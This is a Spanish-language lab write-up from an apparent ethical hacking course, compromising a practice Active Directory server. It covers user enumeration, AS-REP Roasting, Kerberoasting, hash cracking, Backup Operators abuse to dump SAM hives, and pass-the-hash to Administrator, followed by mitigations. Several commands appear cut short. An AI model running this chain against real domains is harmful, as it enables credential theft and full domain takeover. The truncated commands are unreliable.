---
title: "🖥️ Máquina: Examen ad — Hacking Ético"
aliases:
  - Examen ad
  - examen
  - Máquina Examen ad
  - VM Examen ad
  - Writeup Examen ad
tags:
  - ifct0109
  - hacking-etico
  - vms
  - active-directory
  - windows
  - ctf
---

# 🖥️ Máquina: Examen ad

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows Server 2016 — Active Directory  
> **Categoría:** Active Directory  
> **Técnicas trabajadas:** Enumeración web · feroxbuster · kerbrute · AS-REP Roasting · Kerberoasting · Backup Operators abuse · impacket-reg · impacket-secretsdump · Pass-the-Hash · evil-winrm  
> **Descripción:** En esta práctica atacaremos un Windows Server 2016 con Active Directory. Descubriremos usuarios a través de recursos web accesibles, los validaremos con kerbrute, aplicaremos AS-REP Roasting para obtener un hash crackeable, luego Kerberoasting sobre una cuenta de servicio SQL, y finalmente explotaremos los privilegios de Backup Operators para extraer los archivos SAM y comprometer la cuenta Administrador.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.19`
* **`RHOST` (Víctima / Examen ad):** Ej. `10.0.0.5`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Examen ad tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios y configuración del dominio

Comenzamos escaneando puertos:

```bash
sudo nmap -sT -p- 10.0.0.5
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
81/tcp    open  hosts2-ns
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664-49708/tcp open  unknown
```

> [!info] Resultado
> El laboratorio presenta un entorno Windows AD típico con varios servicios expuestos:
> · Servicios de Active Directory: DNS (53), LDAP (389/636), Kerberos (88), Global Catalog (3268/3269), MSRPC (135/593) y SMB (445).
> · Servicios de gestión remota: WinRM (5985) y RDP (3389), que podrían ser vectores de acceso remoto o explotación de credenciales.
> · Servicios web: HTTP/HTTPS (80/443) y un servicio adicional en el puerto 81, que podrían contener aplicaciones con vulnerabilidades.
> · Servicios de autenticación: Kpasswd5 (464) y NetBIOS (139) indican un dominio activo con mecanismos típicos de autenticación Windows.
> Obtenemos el nombre del dominio con ldapsearch:

```bash
ldapsearch -x -LLL -H ldap://10.0.0.5 -s base -b
```

```text
ldapServiceName: examen.local:win-442p9gu13em$@EXAMEN.LOCAL
```

Editamos el archivo hosts:

```bash
sudo nano /etc/hosts
```

```text
10.0.0.5  examen.local
```

> [!info] Resultado
> Guardamos con CTRL+O y salimos con CTRL+X. Investigamos por SMB:

```bash
netexec smb examen.local
```

```text
SMB  10.0.0.5  445  WIN-442P9GU13EM  [*] Windows Server 2016 Standard Evaluation 14393 x64
(name:WIN-442P9GU13EM) (domain:examen.local) (signing:True) (SMBv1:True)
```

> [!info] Resultado
> SMBv1 activo (SMBv1: True) representa un riesgo importante, ya que SMBv1 es vulnerable a exploits antiguos (como EternalBlue) y ataques de movimiento lateral en la red. El signing: True limita la enumeración anónima pero no protege frente a otras técnicas.

Y por los puertos que parecen para navegar:

```bash
nmap -v -A -p80,81 10.0.0.5
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: login page
81/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!info] Resultado
> Tenemos web en dos puertos:
> · http://10.0.0.5/ → hay un escáner de vulnerabilidades Acunetix.
> · http://10.0.0.5:81/ → parecen indicaciones de directorios.
> · http://10.0.0.5:81/ifp/ → hay posibles usuarios.
> Los guardamos en un archivo. Enumeramos ahora con gobuster en los directorios encontrados:

---

## 🌐 Fase 2: Enumeración web y obtención de usuarios

```bash
gobuster dir -r -u http://examen.local -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

En el puerto 81 parece que si aparecen cosas interesantes:

```bash
gobuster dir -r -u http://examen.local:81 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

> [!info] Resultado
> Son muchos directorios, vamos a usar feroxbuster, que es más rápido que gobuster en enumeración recursiva y permite filtrar por extensiones:

```bash
sudo apt update && sudo apt install feroxbuster -y
```

```bash
feroxbuster -u http://examen.local:81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```text
200  GET  3l  3w  27c  http://examen.local:81/Profile/users.txt
```

> [!info] Resultado
> Paramos el feroxbuster con CTRL+C. Descargamos el archivo users.txt y añadimos los usuarios encontrados anteriormente:

```bash
wget http://examen.local:81/Profile/users.txt
```

```bash
cat >> users_examen.txt << EOF
ifp_asrep
guille
julian
EOF
```

Comprobamos que estén todos:

```bash
cat users_examen.txt
```

```bash
cat users_examen.txt | wc -l
```

> [!info] Resultado
> Son 11. Vamos a usar kerbrute para determinar si algún usuario es válido en el dominio:

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
```

```bash
chmod +x kerbrute_linux_amd64
```

```bash
./kerbrute_linux_amd64 userenum -d examen.local --dc 10.0.0.5 ./users_examen.txt -o valid_users.txt
```

```text
2024/07/31 20:25:03 >  [+] VALID USERNAME: guille@examen.local
2024/07/31 20:25:03 >  [+] VALID USERNAME: julian@examen.local
2024/07/31 20:25:03 >  [+] VALID USERNAME: ifp_asrep@examen.local
```

Creamos un valid_examen.txt solo con ellos:

```bash
cat > valid_examen.txt << EOF
guille
julian
ifp_asrep
EOF
```

```bash
cat valid_examen.txt
```

---

## 🎫 Fase 3: AS-REP Roasting — ifp_asrep

Ahora vamos a ver si alguno de los usuarios es vulnerable a ASREP Roasting y podemos obtener un ticket de Kerberos. El usuario que siempre nos interesa es el que sea vulnerable a ASREPROAST: el que tiene el atributo DONT_REQUIRE_PREAUTH activo no requiere una autenticación previa en Kerberos, de forma que el AD nos genera un ticket TGT cifrado con la clave del usuario sin que tengamos que autenticarnos antes. Ese ticket puede crackearse offline:

```bash
impacket-GetNPUsers examen.local/ -usersfile valid_examen.txt -no-pass | grep krb5asrep
```

```text
$krb5asrep$23$ifp_asrep@EXAMEN.LOCAL:0aa0640637c3d0179a350699fde58c58$79fd7f933a072a3fbc1d2bbb2115fc13edd6485c4d4ed628b33ffb8d9e6effb96582a8d65952db1d8b61358513ffaf93059468165d03d7b6a512cb909f6d78a65411e702d09f1e7a46e1a21458603e7487b380333926d7af5cc05d13ca975a881bacfa84dac539dba845d73daba32e8db80bbda1731396adf6a1c57b6394fd87e458a09e9e0e43d0c88287dc0b8874d3da2c8338737e54b64bf50f923b35d4e8fe2a4bc541a493110e1420b00cab0173449378f26add18db5d41dd358fad5847c9d475cf00d2f0046cdb538d86b0e11ab3db3637fba523cc51c0dc476ea1ef680d9a5d2175480cc22718e1e1
[-] User guille doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User julian doesn't have UF_DONT_REQUIRE_PREAUTH set
```

> [!info] Resultado
> Ambos usuarios guille y julian no nos van a servir porque no tienen el NOT PREAUTH. El usuario ifp_asrep sí es vulnerable. Copiamos el hash entero y lo ponemos en un archivo para luego crackearlo:

```bash
nano hash_ifp
```

> [!info] Resultado
> Lo pegamos y luego guardamos con CTRL+O y salimos con CTRL+X. Ahora lo crackeamos con john:

```bash
john hash_ifp --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
Password1  ($krb5asrep$23$ifp_asrep@EXAMEN.LOCAL)
```

> [!info] Resultado
> Credenciales obtenidas: ifp_asrep:Password1. Las comprobamos en diversos servicios.

En WinRM:

```bash
netexec winrm -dc-ip examen.local -u ifp_asrep -p Password1 examen.local
```

```text
WINRM  10.0.0.5  5985  10.0.0.5  [-] c-ip\ifp_asrep:Password1
```

> [!info] Resultado
> No hay posible conexión. Este usuario no está en el grupo "Remote Management Users" para poder acceder por WinRM.

En SMB:

```bash
netexec smb -dc-ip examen.local -u ifp_asrep -p Password1 examen.local
```

```text
SMB  10.0.0.5  445  WIN-442P9GU13EM  [+] c-ip\ifp_asrep:Password1
```

> [!info] Resultado
> Hay conexión pero no hay Pwned! por lo que no es un usuario con privilegios de administrador. Vamos a intentar por Kerberos con impacket-GetUserSPNs para obtener tickets de servicio Kerberos (SPNs) para usuarios en el dominio.

---

## 🎫 Fase 4: Kerberoasting — SVC_SQL

Kerberoasting solicita tickets TGS para cuentas con SPN registrado (normalmente cuentas de servicio). Esos tickets están cifrados con el hash NTLM de la cuenta de servicio y pueden crackearse offline. A diferencia del AS-REP Roasting, aquí sí necesitamos estar autenticados en el dominio, pero lo estamos con ifp_asrep:

```bash
impacket-GetUserSPNs -dc-ip examen.local EXAMEN.LOCAL/ifp_asrep:Password1 -request
```

```text
$krb5tgs$23$*SVC_SQL$EXAMEN.LOCAL$EXAMEN.LOCAL/SVC_SQL*$0cb3d813f63f97581d695224b109f6e9$0d08634d803f76de55c644ddabfb2d19090c9c88439bcb14e4c9e51194ffa6d53f99eeacdb3b5028529cd83f3dd6dbaf53cee93efbe2a2978db15876ec674a1e31aacfa4eb7e2436a41310956f154109d44743b438640c4b435e8f9f688b7565f7329eb644bb770d55fa0f0e6955764dff9dc2cb01a0913aa680f5845583f418dc2f5d4a6c103d83483bc03b648999156a08bb12d3656a4d5e2281595147b11ed83e952748501ced3f3bcf89f6b95f6540cc654f6eafa0cdf88ab9a47ba58e697a61d5e01a50eb3de501827ab73cf02553d9c4d967a43d07c44e7a3546f929f744d86296d906b83ad9fd1290ba9b48dee3c4d7fd067db7742f1bf21708fc667347c10f28fec5ab8840d0d22b8a0f20aa31dfd814bcdf047f80df3f2b98ac415fb238f2a44f50e5d852e8fa2c26ae6366fe2ed9ed3ac882d74c735f7fcda9dd75cbd8b277d0cac07373593994f123ec0a03d1c019bd738a95b769ea2d689a7aca4112d093fe3812bd5a5f77054bdcee5b65b2b9c496ef2f86c3f3194e6a41fed07992509b778b1e82258485db406b2d7e7aaac4e73ade7e3e79bd3e16a4818033f962142875d77c4838fcd8fc1f81993d501be1d919adc5efc5e1af4b4f2b68647e54aec75c85b4eaf6ae3170a4c1de2b8801a0876a1cf3a963501283de1076cd64bd62ec1e409040dff29a1b54cea23bc812a50df6e55fdb65f14c8e3f11233d3fdf73e5e73b0d4180c4740bf5f327207111c08e0fb583731642dbb91bd472bb6ccb2f40b0ca899912e6742b77cde5cfb241a70f9bd49295d9ab64597d0d2192c0fbdb9e483a43b0bef7e0727a62717cf3e2f1cb4f1a73bc65459d15665cb995b8e02131ea54f09c3b6e8238a77a707b3982a79916643b3a102a17261f26696c03b87c0d335406a64095814cb6c775d995e2b4b73b2336da07009d4ccfcb539f606fbb1facfe94bd1a51f6206d287916b1c8711d44c509a39422330f7665a25484975557d63212e98ce2423aacc25545777b824e13199df145583ae966cb25da93722f279ea2491424a6ef4c4fb55d67fc3d25564ff0acbc4beb0ce7c4ef29fdbd960b833b0ebdad0bce5669b3d2403610438abec8658e991492be1220169ffda12531b973c6a97f693114d993c56c7d728f80cfbfb9a3d705d39c96b093c848000b1a3e782bdf6dd172ffc2ba69ef22968013a11070d9b1f81e589f16126f7ed28115213c130141a413333910b2d1ed2898071998fb384a79b0cf2d246726217205390f971ee53a135a82fdc70499e81399c347d66c458ab286efdd851b33dc32cf05a430c69bbf6014751459581b7ba4a04afa40215c31c80566a1afd5eff155c1fa807ec28f899df0a6bf62c0
```

> [!info] Resultado
> Obtenemos un ticket de un usuario SVC_SQL que es una cuenta de servicio (Service Principal Name). Los SPN son utilizados por el protocolo de autenticación Kerberos para asociar un servicio con una cuenta de servicio en Active Directory. Copiamos el hash entero y lo pegamos en el archivo:

```bash
nano hash_svc
```

> [!info] Resultado
> Pegamos el ticket que hemos sacado del SVC_SQL. Guardamos y salimos con CTRL+O y CTRL+X. Crackeamos con john:

```bash
john hash_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
Password!  (?)
```

> [!info] Resultado
> Credenciales obtenidas: svc_sql:Password!. Comprobamos en SMB y WinRM:

```bash
netexec smb -dc-ip examen.local -u svc_sql -p Password! examen.local
```

```text
SMB  10.0.0.5  445  WIN-442P9GU13EM  [+] c-ip\svc_sql:Password!
```

> [!info] Resultado
> Seguimos sin Pwned! aunque la contraseña es válida, no es usuario administrador.

```bash
netexec winrm -dc-ip examen.local -u svc_sql -p Password! examen.local
```

```text
WINRM  10.0.0.5  5985  10.0.0.5  [+] c-ip\svc_sql:Password! (Pwn3d!)
```

> [!info] Resultado
> Ahora sí tenemos Pwned! en WinRM. Probamos a ver si secretsdump nos da algo:

```bash
impacket-secretsdump
```

> [!info] Resultado
> No obtenemos nada. Conectamos entonces con evil-winrm para investigar desde dentro:

---

## 💻 Fase 5: Acceso con evil-winrm y análisis de privilegios

```bash
evil-winrm -i 10.0.0.5 -u
```

Vemos los permisos del usuario:

```bash
whoami /all
```

```text
BUILTIN\Operadores de copia de seguridad  Alias  S-1-5-32-551
Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado

SeBackupPrivilege   Hacer copias de seguridad de archivos y directorios   Habilitada
```

> [!info] Resultado
> El usuario svc_sql pertenece a Operadores de copia de seguridad (Backup Operators) y tiene activo el privilegio SeBackupPrivilege. Este privilegio permite leer cualquier archivo del sistema como si se tratara de una operación de backup, saltándose las ACLs de Windows. Eso incluye los archivos SAM, SYSTEM y SECURITY del registro, que contienen los hashes de todas las cuentas locales. Salimos del evil-winrm para explotarlo desde Kali:

```bash
exit
```

---

## 💾 Fase 6: Extracción de SAM con impacket-reg

Volvemos a Kali. Primero creamos un servidor SMB llamado info donde recibiremos los archivos:

```bash
impacket-smbserver info . -smb2support
```

Ahora en otra terminal de Kali nos traemos los archivos SAM de Windows usando los privilegios de Backup Operators:

```bash
impacket-reg
```

Salimos del servidor SMB con CTRL+C. Y crackeamos los hashes:

```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

> [!info] Resultado
> Obtenemos el hash del Administrador y de MACHINE:

```text
Administrador:500:aad3b435b51404eeaad3b435b51404ee:cfae279a292213ad9968334a452e6b8a:::
```

---

## 🗄️ Fase 7: Pass-the-Hash — acceso como Administrador

Ahora si podemos comprobar con netexec las credenciales del administrador y obtener el Pwned!:

```bash
netexec smb -dc-ip examen.local -u Administrador examen.local -H
```

```text
SMB  10.0.0.5  445  WIN-442P9GU13EM  [+] c-ip\Administrador:cfae279a292213ad9968334a452e6b8a (Pwn3d!)
```

```bash
netexec winrm -dc-ip examen.local -u Administrador examen.local -H
```

```text
WINRM  10.0.0.5  5985  10.0.0.5  [+] c-ip\Administrador:cfae279a292213ad9968334a452e6b8a (Pwn3d!)
```

Entramos:

```bash
evil-winrm -i 10.0.0.5 -u
```

Y obtenemos la bandera:

```bash
type C:\Users\Administrador\Desktop\Flag.txt
```

```text
flag{f3l1c1d4d3s_h4s_4pr0b4d0}
```

> [!info] Resultado
> Flag obtenida: flag{f3l1c1d4d3s_h4s_4pr0b4d0}

---

## 📝 Conclusión general

> [!info] Resultado
> El laboratorio refleja un flujo típico de penetración en un entorno Windows Server 2016 Active Directory:
> · Enumeración inicial: Nmap y LDAP permitieron mapear servicios, hosts y dominio (examen.local).
> · Descubrimiento de usuarios: HTTP/HTTPS y directorios accesibles revelaron posibles usuarios (ifp_asrep, guille, julian) que luego fueron validados con kerbrute.
> · Explotación de Kerberos (AS-REP Roasting): Se identificó que ifp_asrep tenía la bandera DONT_REQUIRE_PREAUTH, lo que permitió obtener su contraseña (Password1).
> · Obtención de credenciales de servicio (Kerberoasting): Se usó impacket-GetUserSPNs sobre la cuenta svc_sql para obtener un ticket Kerberos y crackear su contraseña (Password!).
> · Escalada de privilegios: La cuenta svc_sql pertenecía al grupo Backup Operators, lo que permitió usar impacket-reg para obtener archivos SAM y SYSTEM, extraer hashes y finalmente comprometer la cuenta Administrador.
> · Acceso completo: Con las credenciales de administrador se obtuvo acceso total a SMB y WinRM y se recuperó la flag final.
> Mitigaciones importantes:
> · Evitar cuentas con DONT_REQUIRE_PREAUTH innecesarias, ya que son vulnerables a AS-REP Roasting.
> · Restringir el uso de cuentas de servicio (svc_sql) con privilegios elevados como Backup Operators.
> · Deshabilitar SMBv1, dado que es un protocolo antiguo y vulnerable.
> · Monitorear y restringir accesos remotos (WinRM/RDP) solo a usuarios autorizados.
> · Mantener contraseñas fuertes y rotación periódica de credenciales para todas las cuentas de dominio y servicios.
> El escenario demuestra cómo un atacante puede enumerar usuarios y servicios mediante HTTP/LDAP/SMB, explotar vulnerabilidades de Kerberos (AS-REP Roasting y SPN Kerberoasting) para obtener credenciales, escalar privilegios usando permisos de Backup Operators para extraer hashes y comprometer la cuenta Administrador, obteniendo control total del dominio combinando técnicas de enumeración, cracking de contraseñas y abuso de privilegios de servicio.

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
